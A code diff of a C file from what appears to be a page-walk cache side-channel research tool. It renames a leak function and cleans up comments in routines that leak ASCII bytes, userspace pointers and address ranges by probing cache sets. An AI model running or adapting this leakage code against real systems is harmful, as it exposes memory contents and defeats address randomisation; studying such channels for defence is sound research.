@@ -1,33 +1,27 @@
 #include "leak.h"
 
 
-// TODO mark where is this used? 
-// TODO BETTER NAMING, this kind of sucks and is confusing 
-/*
-   leak_pwsc_non_buffered - leaks just the nonbuffered value in addr
-   input: addr
-   output: uint64_t of non_buffered value
-*/
-uint64_t leak_pwsc_non_buffered(uint64_t addr, uint64_t *init_noise_filter) {
-    // set up run_pwsc
+// This retrives the non-cached VPN or PO in the target page walk
+uint64_t leak_pwsc_non_cached(uint64_t addr, uint64_t *init_noise_filter) {
+    // Set up run_pwsc
     reset_noise_filter(); 
     if(init_noise_filter != NULL)
         for(int i = 0; i < ncache_lines; i++)
             noise_filter[i] = init_noise_filter[i];
 
-    // call run_pwsc
+    // Call run_pwsc
     return get_non_buffered_value(addr);
 }
 
-
+// Just runs the PWSC channel with whatever configurations have been set 
 struct pwsc_ans leak_pwsc_ptr(uint64_t addr, uint64_t *init_noise_filter) {
-    // set up run_pwsc
+    // Set up run_pwsc
     reset_noise_filter(); 
     if(init_noise_filter != NULL)
         for(int i = 0; i < ncache_lines; i++)
             noise_filter[i] = init_noise_filter[i];
 
-    // call run_pwsc
+    // Call run_pwsc
     return run_pwsc(addr); 
 }
 
@@ -43,7 +37,7 @@ struct pwsc_ans leak_ascii(uint64_t addr, uint64_t *init_noise_filter, uint64_t 
     
     // Determine VPN4 cache set (this leaks the initial 6 bits of the ascii character)
     struct pwsc_ans init_pwsc_ans; init_pwsc_ans.va.va = 0; init_pwsc_ans.num_lines_found = 0;
-    uint64_t initial_line = leak_pwsc_non_buffered(addr, init_noise_filter);
+    uint64_t initial_line = leak_pwsc_non_cached(addr, init_noise_filter);
     if(initial_line != ncache_lines) {
         init_pwsc_ans.va.vpn4_set = initial_line;
         init_pwsc_ans.num_lines_found = 1;
@@ -74,7 +68,7 @@ struct pwsc_ans leak_ascii(uint64_t addr, uint64_t *init_noise_filter, uint64_t 
         // find a value. This allows for faster performance and simplier code but can lead to a
         // small drop in accuracy. In the future it might be worthwhile to upgrade this to avoid 
         // this issue. 
-        uint64_t found_line = leak_pwsc_non_buffered(addr, init_noise_filter); 
+        uint64_t found_line = leak_pwsc_non_cached(addr, init_noise_filter); 
         munmap((void *)guess.va.va, 4096); 
         if((found_line != ncache_lines) && found_line != init_pwsc_ans.va.vpn4_set) {
             guess.va.vpn3_set = found_line; 
@@ -88,7 +82,6 @@ struct pwsc_ans leak_ascii(uint64_t addr, uint64_t *init_noise_filter, uint64_t 
 }
 
 
-// TODO THIS IS JUST THE MAPPING ORDER ORACLE :|
 struct pwsc_ans leak_userspace_ptr(uint64_t addr, uint64_t *init_noise_filter, uint64_t expected_vpn4_set) {
     // Leak whatever is mapped (lose the cache offsets here)
     struct pwsc_ans init_profile = leak_pwsc_ptr(addr, init_noise_filter);
@@ -145,7 +138,7 @@ struct pwsc_ans leak_userspace_ptr(uint64_t addr, uint64_t *init_noise_filter, u
             *va_buffer = 0x5A;
 
             // Check if guess is right 
-            uint64_t found_line = leak_pwsc_non_buffered(addr, init_noise_filter); 
+            uint64_t found_line = leak_pwsc_non_cached(addr, init_noise_filter); 
             munmap((void *)va_buffer, 4096); 
             if(found_line != ncache_lines && found_line != previous_set) {
                 if(cur_depth == 1) ret.va.vpn3_set = found_line; 
@@ -235,7 +228,7 @@ struct bit_map* leak_addr_range(uint64_t start_leak, uint64_t end_leak, uint64_t
             .num_lines_found = 0
         };
         if(ascii_flag) ans = leak_ascii(cur_addr, init_noise_filter, previous_set);
-        else ans = leak_userspace_ptr(cur_addr, init_noise_filter, previous_set); // TODO add in ascii hint 
+        else ans = leak_userspace_ptr(cur_addr, init_noise_filter, previous_set);
 
         // In case of larger granularities need additional shifts in the bitmap 
         if(cur_addr != end_leak - 1) 
